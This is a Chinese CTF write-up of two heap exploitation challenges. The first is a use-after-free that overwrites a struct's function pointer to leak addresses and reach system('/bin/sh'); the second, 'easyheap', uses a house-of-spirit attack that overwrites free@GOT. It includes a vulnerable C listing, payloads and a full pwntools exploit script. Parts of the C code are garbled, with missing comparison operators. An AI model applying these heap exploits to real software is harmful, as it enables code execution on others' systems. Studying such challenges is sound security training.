        String *string = malloc(sizeof(String));
        int i;
        char *str = NULL;
        char buf[0x1000];
        size_t size;
        printf("Pls give string size:");
        size = (size_t) getInt();
        if (size  0x1000) {
            printf("Invalid size\n");
            free(string);
            return;
        }
        printf("str:");
        if (read(STDIN_FILENO, buf, size) == -1) {
            printf("got elf!!\n");
            exit(1);
        }
        size = strlen(buf);
        if (size o.array, buf, size);
            string->free = freeShort;
        }
        else {
            str = malloc(size);
            if (str == NULL) {
                printf("malloc faild!\n");
                exit(1);
            }
            strncpy(str, buf, size);
            string->o.buf = str;
            string->free = freeLong;
        }
        string->len = (int) size;
        for (i = 0; i free(string);
        }
    }
    void showMenu(void) {
        printf("1.create string\n");
        printf("2.delete string\n");
        printf("3.quit\n");
    }
首先映入眼帘的就是2个结构体
    typedef struct String
    {
        union {
            char *buf;
            char array[16];
        } o;
        int len;
        void (*free)(struct String *ptr);
    } String;
    struct
    {
        int inuse;
        String *str;
    } Strings[0x10];
create函数。
此时就可以考虑UAF，先通过2次create，然后修改Str结构体函数指针指向一个地址(考虑PIE绕过)。
delete函数。
这边就调用了结构体函数
在查看ida分析的时候，delete函数的调用就显得比较难理解了。
但是回头来看create函数的这边给全局变量string赋值的
或者也可以在ida里面添加结构体来使得更好看，但是这个结构体要自己写，也要看的懂结构体才行。
漏洞分析**
首先是结构体
    typedef struct String
    {
        union {
            char *buf;
            char array[16];
        } o;
        int len;
        void (*free)(struct String *ptr);
    } String;
这个有调用一个函数，这样就很有意思了，就可以把这个函数修改成自己想要的函数。
然后是delete虽然调用了free函数，但是却没有将函数指针设NULL。这边就出现了UAF漏洞。
**解题思路**  
利用UAF漏洞将结构体函数修改成put函数  
通过获取程序基地址绕过PIE  
通过修改printf函数泄露libc_base,或者通过计算偏移得出libc_base  
再次利用UAF漏洞将结构体函数修改成system函数，并在寄存器上布置/bin/sh
free_one的函数地址，我们向上找出一个D开头的可调用的函数地址
D2D这边有个call _puts函数地址，我们可以通过UAF漏洞来修改puts函数的地址
    create(15,"giao1")
    create(15,"giao2") 这边只要小于16就行，会申请一个大小为32的空间
    delete(1)
    delete(0)  此时fast bin 的链表结构为 string1 -> string0
然后需要创建一个大于16且能放下payload大小的堆块。
    create(32,'a'*24+'\x2d')
    delete(1)   调用函数，被修改成puts函数
接收数据，计算elf_base 和printf函数的真实地址,还有一些寄存器的真实地址
    elf_base = u64(p.recv(6).ljust(8,'\x00'))  -0xd2d
    printf_plt = elf_base + 0x9d0
    puts_plt = elf_base + 0x990
    puts_got = elf_base + 0x202030  got地址可以用elf.got['puts']获取
    pop_rdi = elf_base + 0x11e3
    pop_12_15 = elf_base + 0x11dc
然后要删除刚刚创建的那个string，再次调用UAF实现libc_base的泄露。
格式化字符串漏洞泄露：（学艺不精，如果是自己想的话，不太能够想到）
    delete(0)
    create(32,'a'*8 + '%30$p' + 's'*11 + p64(printf_addr))
    delete(1)
    x = p.recv()
    libc_base = int(x[8:22],16) - 0x3b5760
    然后再次使用UAF就行了
    delete(0)
    create(32, '/bin/sh;' + 's'*16 + p64(system_addr))
    delete(1)
（不太行）
通过泄露puts_got计算libc_base
    delete(0)
    payload = 'a'*24+p64(pop_12_15)+'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt) + p64(0xc71+elf_base)  
    其实有点不太能理解这个pop_12_15为什么在这边使用，可以存放后面的参数吧可能，
    然后就是这次的pop_rdi放入参数泄露，最后再回到菜单函数(0xc71)
    create(32,payload)
    puts_addr = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search('/bin/sh').next()
    delete(1)
    delete(0)
    payload = 'a'*24+p64(pop_12_15) +'a'*8 + p64(pop_rdi) + p64(binsh_addr)+ p64(system_addr)
    delete(1)
    再次调用UAF，修改成system，getshell
**总结与理解**
这道题的难度确实在，多次调用UAF漏洞来依次进行elf_base ,libc_base
,getshell的操作，要做到熟悉的使用UAF漏洞还需要进一步的刷题与学习
# 例题
# easyheap
## 程序分析
### create a heap
### edit a heap
### delete a heap
## 思路
创建3个chunk，chunk 0 1 2 ，把chunk1的内容写/bin/sh
利用house of spirit， 制造一个fake chunk到heaparray附近，伪造fake chunk就需要绕过malloc
fastbin的检查。所以仍然需要使用0x7f来构造0x70的fastbin
然后通过伪造的fastbin输入内容覆盖chunk0的地址为free_got的地址
然后编辑chunk0将free_got修改成system_plt
这样把chunk1 free掉的时候就会调用system("/bin/sh")
## 脚本调试
    from pwn import *
    p = process('./easyheap')
    #p = remote('node4.buuoj.cn',25139)
    elf =ELF('./easyheap')
    def create(size,content):
        p.recvuntil('Your choice :')
        p.sendline('1')
        p.recvuntil('Size of Heap : ')
        p.send(str(size))
        p.recvuntil('Content of heap:')
        p.send(str(content))    
    def edit(index,size,content):
        p.recvuntil('Your choice :')
        p.sendline('2')
        p.recvuntil('Index :')
        p.sendline(str(index))
        p.recvuntil('Size of Heap : ')
        p.send(str(size))
        p.recvuntil('Content of heap : ')
        p.send(str(content))
    def delete(index):
        p.recvuntil('Your choice :')
        p.sendline('3')
        p.recvuntil('Index :')
        p.sendline(str(index))
    free_got = elf.got['free']
    create(0x68,'aaaa')
    create(0x68,'bbbb')
    create(0x68,'cccc')
    delete(2)
    #gdb.attach(p)
    payload = '/bin/sh\x00' + 'a' * 0x60 + p64(0x71) + p64(0x6020b0-3)
    edit(1,len(payload),payload)
    create(0x68,'aaaa')
    create(0x68,'c')
    payload = p8(0)* 35 + p64(free_got)
    edit(3,len(payload),payload)
    payload = p64(elf.plt['system'])
    #gdb.attach(p)
    edit(0,len(payload),payload)
    delete(1)
    #gdb.attach(p)
    p.interactive()
在第一个payload发送之前断点